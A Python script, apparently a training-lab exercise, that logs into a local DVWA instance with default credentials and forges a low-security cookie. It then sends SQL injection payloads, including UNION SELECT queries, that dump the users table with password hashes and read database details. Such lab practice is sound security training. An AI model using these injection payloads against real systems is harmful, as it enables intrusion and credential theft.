
import requests
import re

s = requests.Session()

# Step 0: Run setup.php to initialize the database
print("[0] Running setup.php to initialize database...")
setup_resp = s.get('http://localhost:28080/setup.php')
print(f"[0] Setup page status: {setup_resp.status_code}")

# Look for the "Create / Reset Database" button
if 'Create' in setup_resp.text or 'Reset' in setup_resp.text:
    # Get CSRF token if present
    setup_token = re.search(r"user_token.*?value='([a-f0-9]+)'", setup_resp.text)
    setup_data = {'create_db': 'Create / Reset Database'}
    if setup_token:
        setup_data['user_token'] = setup_token.group(1)
        print(f"[0] Setup CSRF token: {setup_token.group(1)}")
    
    # Also try without CSRF token
    setup_post = s.post('http://localhost:28080/setup.php', data=setup_data, allow_redirects=True)
    print(f"[0] Setup POST status: {setup_post.status_code}")
    
    # Check results
    if 'Database setup' in setup_post.text.lower() or 'success' in setup_post.text.lower():
        print("[0] ✅ Database initialized!")
    elif 'already' in setup_post.text.lower():
        print("[0] Database already exists, proceeding...")
    
    # Look for success indicators
    success_msgs = re.findall(r'<div[^>]*class="[^"]*"[^>]*>(.*?)</div>', setup_post.text, re.DOTALL)
    for msg in success_msgs:
        clean = re.sub(r'<[^>]+>', '', msg).strip()
        if clean:
            print(f"[0] Message: {clean[:200]}")
else:
    print("[0] No setup button found")
    print(f"[0] Content: {setup_resp.text[:500]}")

# Step 1: Login
print(f"\n{'='*60}")
print("[1] Logging in...")
login_page = s.get('http://localhost:28080/login.php')
token_match = re.search(r"user_token.*?value='([a-f0-9]+)'", login_page.text)
if token_match:
    token = token_match.group(1)
    print(f"[1] CSRF token: {token}")
    
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': token
    }
    login_resp = s.post('http://localhost:28080/login.php', data=login_data, allow_redirects=True)
    print(f"[1] Login status: {login_resp.status_code}, URL: {login_resp.url}")
    print(f"[1] Cookies: {dict(s.cookies)}")
    
    if 'Welcome' in login_resp.text or 'index.php' in login_resp.url:
        print("[1] ✅ LOGIN SUCCESS!")
    else:
        print("[1] Login result unknown")
        if 'Login failed' in login_resp.text:
            print("[1] ❌ LOGIN FAILED")
        errors = re.findall(r'<div[^>]*>(.*?)</div>', login_resp.text, re.DOTALL)
        for err in errors:
            clean = re.sub(r'<[^>]+>', '', err).strip()
            if clean and len(clean) < 200:
                print(f"[1] {clean}")

# Step 2: Force security to low via cookie
s.cookies.set('security', 'low', domain='localhost', path='/')
print(f"\n[2] Forged security=low")

# Step 3: Test SQLi
print(f"\n{'='*60}")
print("[3] SQL Injection attack...")
sqli_url = "http://localhost:28080/vulnerabilities/sqli/"

# Test 1: Basic boolean injection
resp1 = s.get(sqli_url, params={"id": "1' OR '1'='1", "Submit": "Submit"})
print(f"[3] Test 1 status: {resp1.status_code}, URL: {resp1.url}")

if 'login.php' in resp1.url:
    print("[3] ❌ Still redirected to login!")
else:
    pre_matches = re.findall(r'<pre>(.*?)</pre>', resp1.text, re.DOTALL)
    if pre_matches:
        print(f"[3] ✅ SQLi WORKS! Found {len(pre_matches)} results:")
        for m in pre_matches[:5]:
            print(f"    {m.strip()[:200]}")
    
    # Test 2: UNION to dump users
    resp2 = s.get(sqli_url, params={"id": "1' UNION SELECT user,password FROM dvwa.users#", "Submit": "Submit"})
    pre2 = re.findall(r'<pre>(.*?)</pre>', resp2.text, re.DOTALL)
    if pre2:
        print(f"\n[3] 🏆 DUMPED USERS TABLE:")
        for m in pre2:
            print(f"    {m.strip()}")
    
    # Test 3: Get DB version
    resp3 = s.get(sqli_url, params={"id": "1' UNION SELECT version(),user()#", "Submit": "Submit"})
    pre3 = re.findall(r'<pre>(.*?)</pre>', resp3.text, re.DOTALL)
    if pre3:
        print(f"\n[3] 🏆 DB VERSION/INFO:")
        for m in pre3:
            print(f"    {m.strip()}")

